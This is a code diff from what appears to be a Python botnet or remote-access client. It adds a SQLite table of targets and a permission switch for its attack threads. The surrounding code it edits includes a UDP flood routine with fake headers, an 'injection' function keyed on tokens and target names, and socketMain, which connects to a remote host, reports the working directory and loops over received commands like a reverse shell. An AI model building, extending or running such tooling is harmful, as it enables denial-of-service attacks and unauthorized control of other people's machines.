@@ -62,6 +62,95 @@ import os
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
+
+def targetData(command, user_name=None, ID=None,threadPermisstion='Allow', threadStatus='Running'):
+    """
+    Manages target data in a SQLite database.
+    Args:
+        command (str): The command to execute ('create_target' or 'get').
+        user_name (str, optional): The name of the target to create.
+        ID (str, optional): The unique identifier for the target.
+    Returns:
+        str or list: A message indicating success or failure for 'create_target',
+                     or a list of all target data for 'get'.
+    """
+    conn = sqlite3.connect('info.db')
+    cursour = conn.cursor()
+
+    # Create tables separately
+    cursour.execute("""
+        CREATE TABLE IF NOT EXISTS target_data(
+            id TEXT PRIMARY KEY NOT NULL,
+            target_name TEXT NOT NULL,
+            is_registor TEXT
+        )
+    """)
+
+    cursour.execute("""
+        CREATE TABLE IF NOT EXISTS therade_permission(
+            id TEXT PRIMARY KEY NOT NULL,
+            threadPermission TEXT NOT NULL
+        )
+    """)
+
+    cursour.execute("""
+        CREATE TABLE IF NOT EXISTS thread_status(
+            thread_id TEXT PRIMARY KEY NOT NULL,
+            threadStatus TEXT NOT NULL
+        )
+    """)
+
+
+    if command == 'create_target' and user_name != None and ID != None:
+        try:
+
+            cursour.execute('INSERT INTO target_data(id, target_name,is_registor) VALUES(?,?,?)',(ID,user_name,'0'))
+            conn.commit()
+            return "Target was created succssefuly"
+        
+        except Exception as e:
+
+            print(e)
+            return "Something went wronge"
+        
+    elif command == "get":
+
+        cursour.execute("SELECT * FROM target_data")
+        data = cursour.fetchall()
+        return data
+    elif command == 'setPermission':
+        # get all thread avilble
+        cursour.execute("SELECT * FROM therade_permission")
+        data = cursour.fetchall()
+        if len(data) != 0:
+            # check if the ID is already set
+            if data[0][0] == ID:
+                # update the thread permission
+                cursour.execute('UPDATE therade_permission SET threadPermission = ? WHERE id = ?', (threadPermisstion, ID))
+                conn.commit()
+                return "Thread permission was updated successfully"
+        # if not set insert the new one
+        cursour.execute('INSERT INTO therade_permission(id, threadPermission) VALUES(?,?)',(ID,threadPermisstion))
+        conn.commit()
+        return "Thread permission was set successfully"
+    elif command == 'save_thread_info':
+        cursour.execute('INSERT INTO thread_status(thread_id, threadStatus) VALUES(?,?)',(ID,threadStatus))
+        conn.commit()
+        return "Target was created succssefuly"
+    elif command == 'getThread':
+
+        cursour.execute("SELECT * FROM thread_status")
+        data = cursour.fetchall()
+        return data
+    elif command == 'getPermission':
+        cursour.execute("SELECT * FROM therade_permission")
+        data = cursour.fetchall()
+        return data
+
+
+initPermission = targetData(command='setPermission')
+
+
 def is_android():
     """Checks if the current operating system is Android."""
     return 'ANDROID_ROOT' in os.environ or os.path.exists('/system/build.prop')
@@ -300,8 +389,8 @@ def send_udp_flood(thread_id, ports,TARGET_IP,PACKET_SIZE,FAKE_HEADERS,BASE_DELA
 
 
 # Command Interface
-def command_interface(threads):
-    while True:
+def command_interface(threads,threadPermission):
+    while threadPermission == 'Allow':
         cmd = input("\nEnter command (status / stop): ").strip().lower()
         
         if cmd == "status":
@@ -317,6 +406,7 @@ def command_interface(threads):
                 t.join()  
             print("All threads stopped. Exiting.")
             break
+        threadPermission = targetData(command='getPermission')[0][1]
 
 # udp-flood(socket)
 def initUdpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
@@ -392,46 +482,6 @@ def ID(n=5):
         )
         return RandomID
 
-
-def targetData(command, user_name=None, ID=None):
-    """
-    Manages target data in a SQLite database.
-    Args:
-        command (str): The command to execute ('create_target' or 'get').
-        user_name (str, optional): The name of the target to create.
-        ID (str, optional): The unique identifier for the target.
-    Returns:
-        str or list: A message indicating success or failure for 'create_target',
-                     or a list of all target data for 'get'.
-    """
-    conn = sqlite3.connect('info.db')
-    cursour = conn.cursor()
-
-    cursour.execute("""
-        CREATE TABLE IF NOT EXISTS target_data(
-            id TEXT PRIMARY KEY NOT NULL,
-            target_name TEXT NOT NULL,
-            is_registor text
-        )
-    """)
-
-    if command == 'create_target' and user_name != None and ID != None:
-        try:
-
-            cursour.execute('INSERT INTO target_data(id, target_name,is_registor) VALUES(?,?,?)',(ID,user_name,'0'))
-            conn.commit()
-            return "Target was created succssefuly"
-        
-        except Exception as e:
-
-            print(e)
-            return "Something went wronge"
-        
-    elif command == "get":
-
-        cursour.execute("SELECT * FROM target_data")
-        data = cursour.fetchall()
-        return data
 
 
 def injection(token,target_name,method='GET'):
@@ -800,10 +850,11 @@ def send(com,_port):
                     if not (data):
                         break
                     _s.send(data)
+
         except:
             _s.close()
 
-def socketMain(host,port):
+def socketMain(host,port,threadPermission):
     """
     Main function to establish a socket connection and handle commands.
     It connects to a server, retrieves the current working directory,
@@ -817,7 +868,7 @@ def socketMain(host,port):
         pwd = dir_chacker(_pwd)
         s.send(pwd.encode())
 
-        while True:
+        while threadPermission == 'Allow':
             data = s.recv(1024)
             if not data:
                 break
@@ -871,6 +922,8 @@ def socketMain(host,port):
         print(f"[!] Connection error: {e}")
     finally:
         s.close()
+
+    threadPermission = targetData(command='getPermission')[0][1]
 
 # brute force section is not implemented in this code snippet.
 
@@ -935,7 +988,8 @@ def main():
     It retrieves target information, processes instructions, and executes commands
     based on the retrieved instructions.
     """
-    while True:
+    threadPermission = targetData(command='getPermission')[0][1]
+    while threadPermission == 'Allow':
         # Retrieve target info
         target_info = targetData(command='get')
         delay = 5
@@ -1030,6 +1084,7 @@ def main():
 
         # Wait before repeating the process
         time.sleep(delay)
+        threadPermission = targetData(command='getPermission')[0][1]
 
         # Uncomment the line below to enable socketMain functionality
         # socketMain()
